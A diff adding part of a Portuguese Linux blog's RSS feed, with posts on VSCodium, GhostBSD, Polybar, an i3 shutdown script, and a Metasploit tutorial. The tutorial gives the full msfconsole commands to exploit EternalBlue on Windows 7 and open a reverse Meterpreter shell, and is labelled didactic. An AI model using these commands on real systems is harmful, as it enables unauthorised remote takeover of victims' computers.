+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt update &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;apt &lt;span class=&quot;nb&quot;&gt;install &lt;/span&gt;vscodium&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;E pronto! Basta procurar o VSCodium no dash do seu ambiente!&lt;/p&gt;
+
+&lt;h2 id=&quot;links-úteis&quot;&gt;Links Úteis&lt;/h2&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Página oficial do VSCodium: &lt;a href=&quot;https://vscodium.com/&quot;&gt;https://vscodium.com/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;GitHub do VSCodium: &lt;a href=&quot;https://github.com/VSCodium/vscodium&quot;&gt;https://github.com/VSCodium/vscodium&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+</description>
+        <pubDate>Thu, 18 Apr 2019 11:03:26 -0300</pubDate>
+        <link>http://localhost:4000/2019/04/vscodium-um-vs-code-open-source-que-nao-te-rasrtreia.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/04/vscodium-um-vs-code-open-source-que-nao-te-rasrtreia.html</guid>
+        
+        <category>windows</category>
+        
+        <category>editor</category>
+        
+        <category>shellscript</category>
+        
+        <category>bash</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Como Acessar o Windows pelo Linux com Metasploit</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/metasploit-linux-min.jpg&quot; alt=&quot;Como Acessar o Windows pelo Linux com Metasploit&quot; /&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;introdução&quot;&gt;Introdução&lt;/h2&gt;
+
+&lt;p&gt;O &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;Metasploit&lt;/a&gt; é um projeto de segurança da informação que fornece informações sobre vulnerabilidades de segurança e ajuda nos testes de penetração .&lt;/p&gt;
+
+&lt;p&gt;É de propriedade da empresa de segurança Rapid7 , de Boston, Massachusetts que possui diversos softwares ( &lt;strong&gt;Opcode&lt;/strong&gt; - &lt;em&gt;Banco de Dados&lt;/em&gt; ; e o &lt;strong&gt;Shellcode&lt;/strong&gt; , &lt;em&gt;que executa comandos de&lt;/em&gt; &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;Shell Script&lt;/a&gt;, … ), entre eles o mais conhecido que é o &lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot;&gt;Metasploit Framework&lt;/a&gt;, um software de código aberto uma ferramenta para explorar falhas de uma máquina remota.&lt;/p&gt;
+
+&lt;p&gt;O Metasploit possui 6 tipos de módulos (&lt;em&gt;auxiliary&lt;/em&gt;, &lt;em&gt;exploit&lt;/em&gt;, &lt;em&gt;payload&lt;/em&gt;, &lt;em&gt;post&lt;/em&gt;, &lt;em&gt;encoder&lt;/em&gt; e &lt;em&gt;nop&lt;/em&gt;) . No vídeo apresentado por nós vamos utilizar o &lt;a href=&quot;https://github.com/rapid7/metasploit-framework/wiki/Meterpreter&quot;&gt;Meterpreter&lt;/a&gt; que  é um &lt;em&gt;payload&lt;/em&gt; avançado.&lt;/p&gt;
+
+&lt;h2 id=&quot;instalação&quot;&gt;Instalação&lt;/h2&gt;
+
+&lt;p&gt;Existem diversas maneiras de você instalar o &lt;strong&gt;Metasploit Framework&lt;/strong&gt; . Baixando diretamente pelo site &lt;a href=&quot;https://www.metasploit.com/&quot;&gt;https://www.metasploit.com/&lt;/a&gt; ou pelo GitHub &lt;a href=&quot;https://github.com/rapid7/metasploit-framework&quot;&gt;https://github.com/rapid7/metasploit-framework&lt;/a&gt; . Ou instalando via gerenciador de pacotes da sua distribuição, por exemplo, na distribuição que eu utilizo &lt;a href=&quot;https://gentoo.org&quot;&gt;Gentoo&lt;/a&gt; basta realizar os comandos abaixo:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# su ou sudo&lt;/span&gt;
+emerge &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; net-analyzer/metasploit &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+dev-ruby/metasploit_payloads-mettle &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+dev-ruby/metasploit_data_models &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+dev-ruby/metasploit-payloads &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+dev-ruby/metasploit-model &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+dev-ruby/metasploit-credential &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+dev-ruby/metasploit-concern &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+app-eselect/eselect-metasploit&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;O comando acima irá pedir para atualizar o &lt;em&gt;package.use&lt;/em&gt; por conta das flags, então rode o comando:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;etc-update &lt;span class=&quot;nt&quot;&gt;--automode&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-5&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;E então rode o comando de instalação novamente.&lt;/p&gt;
+
+&lt;p&gt;Após instalação, talvez você não encontre o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;msfconsole&lt;/code&gt; responsável por abrir o Metasploit, então crie um link simbólico com o &lt;em&gt;root&lt;/em&gt; ou &lt;em&gt;sudo&lt;/em&gt;, com o comando abaixo:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nb&quot;&gt;ln&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; /usr/lib64/metasploit4.17/msfconsole /usr/bin/msfconsole&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;E pronto, o Metasploit está pronto para uso! Lembrando que em algumas distribuições já possuem o Metasploit instalado por padrão, como o &lt;a href=&quot;http://terminalroot.com.br/2018/02/como-instalar-o-pentoo-um-gentoo-para-pentest.html&quot;&gt;Pentoo&lt;/a&gt; e o &lt;a href=&quot;https://www.kali.org/&quot;&gt;Kali Linux&lt;/a&gt; entre outras criadas especialmente para testes de invasão.&lt;/p&gt;
+
+&lt;p&gt;Próximo passo é rodar o Metasploit rodando o comando:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;msfconsole&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Isso irá abrir o framework, e em seguida usaremos o Meterpreter para acessar o &lt;a href=&quot;http://terminalroot.com.br/2018/03/como-usar-o-shell-bash-no-windows.html&quot;&gt;Windows&lt;/a&gt; , basta rodar os comandos abaixo na ordem:&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;use exploit/windows/smb/ms17_010_eternalblue
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST NÚMERO_IP_DA_MÁQUINA_WINDOWS
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;LHOST NÚMERO_IP_DA_SUA_MÁQUINA
+&lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;encoder generic/none
+exploit&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Lembrando que esses comandos são a grosso modo e servem para Windows 7 Service Pack 1 , para outras versões assista o vídeo com link abaixo que há mais detalhes para variados casos:&lt;/p&gt;
+
+&lt;p&gt;Após acessar você pode obter informações detalhadas do sistema com o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;sysinfo&lt;/code&gt;; tirar um print da tela com o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;screenshot&lt;/code&gt; ; saber qual diretório você está com o comando &lt;code class=&quot;highlighter-rouge&quot;&gt;pwd&lt;/code&gt; a saída será algo do tipo *c:\windows\system32* ; desligar, reiniciar,… entre vários comando que podem ser consultado pelo comando &lt;code class=&quot;highlighter-rouge&quot;&gt;help&lt;/code&gt; .&lt;/p&gt;
+
+&lt;h2 id=&quot;assista-ao-vídeo&quot;&gt;Assista ao Vídeo&lt;/h2&gt;
+
+&lt;h1 id=&quot;clique-aqui-para-ver-o-vídeo&quot;&gt;&lt;a href=&quot;https://youtu.be/VcbC0yJsWic&quot;&gt;Clique Aqui Para Ver o Vídeo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Esse artigo e o vídeo apresentado foram criados com finalidade didática.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;conheça-nosso-treinamentos-de-shell-script-vim-expressões-regulares-e-sed&quot;&gt;Conheça nosso Treinamentos de Shell Script, Vim, Expressões Regulares e Sed&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrcursos&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;http://terminalroot.com.br/cursos&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;crie-sua-promoção&quot;&gt;Crie Sua Promoção&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrpromo&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/promo&quot;&gt;http://terminalroot.com.br/promo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;acompanhe-todos-os-vídeos-da-série-shell-script-profissional&quot;&gt;Acompanhe todos os vídeos da &lt;strong&gt;Série Shell Script Profissional&lt;/strong&gt;&lt;/h2&gt;
+&lt;h1 id=&quot;shellpro&quot;&gt;&lt;a href=&quot;http://bit.ly/shell-pro-root&quot;&gt;#ShellPro&lt;/a&gt;&lt;/h1&gt;
+
+&lt;p&gt;Comente!&lt;/p&gt;
+</description>
+        <pubDate>Wed, 17 Apr 2019 18:03:35 -0300</pubDate>
+        <link>http://localhost:4000/2019/04/como-acessar-o-windows-pelo-linux-com-metasploit.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/04/como-acessar-o-windows-pelo-linux-com-metasploit.html</guid>
+        
+        <category>metasploit</category>
+        
+        <category>security</category>
+        
+        <category>windows</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Conheça o GhostBSD - Um Sistema Simples, Rápido e Elegante</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/bsd/ghostbsd.jpg&quot; alt=&quot;Conheça o GhostBSD - Um Sistema Simples, Rápido e Elegante&quot; title=&quot;GhostBSD&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;O &lt;a href=&quot;https://www.ghostbsd.org/&quot;&gt;GhostBSD&lt;/a&gt; é um sistema operacional baseado no FreeBSD  , é para desktops, pré-configurado com o conjunto de softwares mínimos pré-instalados.&lt;/p&gt;
+
+&lt;p&gt;O &lt;strong&gt;GhostBSD&lt;/strong&gt; usa GTK com o Ambiente de Desktop &lt;a href=&quot;http://cse.google.com.br/cse?cx=004473188612396442360:qs2ekmnkweq&amp;amp;q=MATE&quot;&gt;MATE&lt;/a&gt; . É fácil de instalar, pronto para uso e fácil de usar. O objetivo do projeto é combinar segurança, privacidade, estabilidade, usabilidade, abertura, liberdade e ser gratuito.&lt;/p&gt;
+
+&lt;p&gt;Algumas fontes afirma que o GhostBSD é baseado no TrueOS que por sua vez é baseado no &lt;a href=&quot;http://cse.google.com.br/cse?cx=004473188612396442360:qs2ekmnkweq&amp;amp;q=freebsd&quot;&gt;FreeBSD&lt;/a&gt; , logo , direta ou indiretamente ambos são baseados no FreeBSD.&lt;/p&gt;
+
+&lt;p&gt;O sistema possui cláusulas da &lt;em&gt;Licença BSD Simplificada&lt;/em&gt; ou &lt;em&gt;Licença FreeBSD&lt;/em&gt;, além disso contém alguns softwares licenciados sob a &lt;em&gt;GPL&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;Requisitos Mínimos recomendados para possuir o sistema.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Pentium 4 ou superior&lt;/li&gt;
+  &lt;li&gt;1024 MB de RAM&lt;/li&gt;
+  &lt;li&gt;20 GB de espaço livre no disco rígido&lt;/li&gt;
+  &lt;li&gt;Placa rede&lt;/li&gt;
+  &lt;li&gt;Placa de som&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;site-oficial-do-ghostbsd-httpswwwghostbsdorg--no-site-você-pode-obter-mais-informações-além-de-atualizações-e-relatos-de-bugs-como-pode-conferir-na-imagem-abaixo&quot;&gt;Site Oficial do GhostBSD: &lt;a href=&quot;https://www.ghostbsd.org/&quot;&gt;https://www.ghostbsd.org/&lt;/a&gt; , no site você pode obter mais informações além de atualizações e relatos de bugs, como pode conferir na imagem abaixo:&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/img/bsd/bug-latest-ghostbsd.png&quot; alt=&quot;Atualizações e Notícias do GhostBSD&quot; title=&quot;Atualizações e Notícias do GhostBSD&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Acompanhe todas as notícias: &lt;a href=&quot;https://www.ghostbsd.org/news&quot;&gt;https://www.ghostbsd.org/news&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;assista-o-vídeo-saiba-como-instalar-e-uma-breve-review-sobre-o-ghostbsd&quot;&gt;Assista o Vídeo Saiba como Instalar e uma breve Review sobre o GhostBSD&lt;/h2&gt;
+&lt;h1 id=&quot;clique-aqui-para-assistir-ao-vídeo&quot;&gt;&lt;a href=&quot;https://youtu.be/BaOYhWDWl0g&quot;&gt;Clique Aqui Para Assistir ao Vídeo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;conheça-nosso-treinamentos-de-shell-script-vim-expressões-regulares-e-sed&quot;&gt;Conheça nosso Treinamentos de Shell Script, Vim, Expressões Regulares e Sed&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrcursos&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;http://terminalroot.com.br/cursos&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;crie-sua-promoção&quot;&gt;Crie Sua Promoção&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrpromo&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/promo&quot;&gt;http://terminalroot.com.br/promo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;acompanhe-todos-os-vídeos-da-série-shell-script-profissional&quot;&gt;Acompanhe todos os vídeos da &lt;strong&gt;Série Shell Script Profissional&lt;/strong&gt;&lt;/h2&gt;
+&lt;h1 id=&quot;shellpro&quot;&gt;&lt;a href=&quot;http://bit.ly/shell-pro-root&quot;&gt;#ShellPro&lt;/a&gt;&lt;/h1&gt;
+
+&lt;p&gt;Comente!&lt;/p&gt;
+</description>
+        <pubDate>Sat, 13 Apr 2019 15:33:00 -0300</pubDate>
+        <link>http://localhost:4000/2019/04/ghostbsd-simples-rapido-elegante.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/04/ghostbsd-simples-rapido-elegante.html</guid>
+        
+        <category>ghostbsd</category>
+        
+        <category>freebsd</category>
+        
+        <category>bsd</category>
+        
+        <category>video</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Como Deixar Seu POLYBAR com POWERLINE</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/dicas/polybar-powerline.jpg&quot; alt=&quot;Como Deixar Seu POLYBAR com POWERLINE&quot; /&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;clique-aqui-para-assistir-o-vídeo&quot;&gt;&lt;a href=&quot;https://youtu.be/-iNkTSunmZ4&quot;&gt;Clique Aqui Para Assistir o Vídeo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;conheça-nosso-treinamentos-de-shell-script-vim-expressões-regulares-e-sed&quot;&gt;Conheça nosso Treinamentos de Shell Script, Vim, Expressões Regulares e Sed&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrcursos&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;http://terminalroot.com.br/cursos&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;crie-sua-promoção&quot;&gt;Crie Sua Promoção&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrpromo&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/promo&quot;&gt;http://terminalroot.com.br/promo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;acompanhe-todos-os-vídeos-da-série-shell-script-profissional&quot;&gt;Acompanhe todos os vídeos da &lt;strong&gt;Série Shell Script Profissional&lt;/strong&gt;&lt;/h2&gt;
+&lt;h1 id=&quot;shellpro&quot;&gt;&lt;a href=&quot;http://bit.ly/shell-pro-root&quot;&gt;#ShellPro&lt;/a&gt;&lt;/h1&gt;
+
+&lt;p&gt;Comente!&lt;/p&gt;
+</description>
+        <pubDate>Tue, 09 Apr 2019 21:33:03 -0300</pubDate>
+        <link>http://localhost:4000/2019/04/como-deixar-seu-polybar-com-powerline.html</link>
+        <guid isPermaLink="true">http://localhost:4000/2019/04/como-deixar-seu-polybar-com-powerline.html</guid>
+        
+        <category>polybar</category>
+        
+        <category>dicas</category>
+        
+        
+      </item>
+    
+      <item>
+        <title>Como Criar um Sistema de Desligamento para o i3 com Shell Script</title>
+        <description>&lt;p&gt;&lt;img src=&quot;/assets/img/gentoo/shell-script-i3-yad-gentoo.png&quot; alt=&quot;Como Criar um Sistema de Desligamento para o i3 com Shell Script&quot; /&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Nesse exemplo vamos usar uma ferramenta para Shell Script: &lt;a href=&quot;https://github.com/v1cont/yad&quot;&gt;Yad&lt;/a&gt;.&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Primeiramente precisamos instalar alguns programas para que o sistema funcione corretamente. E no caso do &lt;a href=&quot;http://terminalroot.com.br/2017/05/como-instalar-o-gentoo.html&quot;&gt;Gentoo&lt;/a&gt;, precisamos passar algumas flags. Em resumo o comando de instalação fica:&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Para mais detalhes assista o vídeo&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;nv&quot;&gt;USE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;X examples&quot;&lt;/span&gt; emerge &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; gtk+ polybar &lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Depois configuramos o Polybar e o Sudo&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Agora precisamos clonar, compilar e instalar o &lt;a href=&quot;https://github.com/v1cont/yad&quot;&gt;Yad&lt;/a&gt; , na sua distribuição talvez basta usar o gerenciador de pacotes.&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;git clone https://github.com/v1cont/yad
+su &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cd &lt;/span&gt;yad &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; autoreconf &lt;span class=&quot;nt&quot;&gt;-ivf&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; intltoolize
+./configure &lt;span class=&quot;nt&quot;&gt;--enable-html&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--enable-icon-browser&lt;/span&gt;
+make &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; make &lt;span class=&quot;nb&quot;&gt;install&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Agora criaremos nosso sistema em &lt;a href=&quot;http://terminalroot.com.br/shell&quot;&gt;Shell Script&lt;/a&gt;&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Lembrando que usamos o ícone com as dimensões similares a esse: &lt;a href=&quot;http://terminalroot.com.br/img/favicon.png&quot;&gt;http://terminalroot.com.br/img/favicon.png&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://terminalroot.com.br/img/favicon.png -O icon.png&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+&lt;span class=&quot;nv&quot;&gt;acao&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;$(&lt;/span&gt;yad &lt;span class=&quot;nt&quot;&gt;--center&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--width&lt;/span&gt; 500 &lt;span class=&quot;nt&quot;&gt;--height&lt;/span&gt; 100 &lt;span class=&quot;nt&quot;&gt;--entry&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--title&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Sistema de Desligamento&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;--image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;icon.png &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;--button&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Ok:0&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;--button&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Fechar:1&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;--text&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Escolha:&quot;&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	&lt;span class=&quot;nt&quot;&gt;--entry-text&lt;/span&gt; &lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+	&lt;span class=&quot;s2&quot;&gt;&quot;Desligar&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Reiniciar&quot;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;Encerrar Sessao&quot;&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$acao&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt;
+	&lt;span class=&quot;s2&quot;&gt;&quot;Desligar&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;shutdown &lt;span class=&quot;nt&quot;&gt;-ah&lt;/span&gt; now&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+	&lt;span class=&quot;s2&quot;&gt;&quot;Reiniciar&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;shutdown &lt;span class=&quot;nt&quot;&gt;-ar&lt;/span&gt; now&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+	&lt;span class=&quot;s2&quot;&gt;&quot;Encerrar Sessao&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; i3-msg &lt;span class=&quot;nb&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+	&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; : &lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;esac&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;Finalizamos efetuando modificações no &lt;code class=&quot;highlighter-rouge&quot;&gt;$HOME/.config/i3/config&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;p&gt;Comandos e configs específicos usados no vídeo&lt;/p&gt;
+
+&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# linha de comando&lt;/span&gt;
+which poweroff reboot shutdown | &lt;span class=&quot;nb&quot;&gt;paste&lt;/span&gt; - - - | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\t'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;','&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# sudoers&lt;/span&gt;
+marcos &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; ALL
+marcos &lt;span class=&quot;nv&quot;&gt;ALL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;NOPASSWD:/sbin/poweroff,/sbin/reboot,/sbin/shutdown
+
+&lt;span class=&quot;c&quot;&gt;# i3/config&lt;/span&gt;
+exec_always &lt;span class=&quot;nv&quot;&gt;$HOME&lt;/span&gt;/.config/polybar/launch.sh
+for_window &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;instance&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;yad&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; floating &lt;span class=&quot;nb&quot;&gt;enable&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# polybar&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;module/desligar]
+&lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; custom/script
+&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; ~/.config/polybar/d.sh
+&lt;span class=&quot;nb&quot;&gt;tail&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;true
+&lt;/span&gt;click-left &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; /usr/bin/desligar&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;
+
+&lt;p&gt;Para entender melhor, assista o vídeo:&lt;/p&gt;
+
+&lt;h1 id=&quot;clique-aqui-para-assistir-o-vídeo&quot;&gt;&lt;a href=&quot;https://youtu.be/Szoid9aH9Tw&quot;&gt;Clique Aqui Para Assistir o Vídeo&lt;/a&gt;&lt;/h1&gt;
+
+&lt;hr /&gt;
+
+&lt;h2 id=&quot;conheça-nosso-treinamentos-de-shell-script-vim-expressões-regulares-e-sed&quot;&gt;Conheça nosso Treinamentos de Shell Script, Vim, Expressões Regulares e Sed&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrcursos&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/cursos&quot;&gt;http://terminalroot.com.br/cursos&lt;/a&gt;&lt;/h1&gt;
+
+&lt;h2 id=&quot;crie-sua-promoção&quot;&gt;Crie Sua Promoção&lt;/h2&gt;
+&lt;h1 id=&quot;httpterminalrootcombrpromo&quot;&gt;&lt;a href=&quot;http://terminalroot.com.br/promo&quot;&gt;http://terminalroot.com.br/promo&lt;/a&gt;&lt;/h1&gt;
+
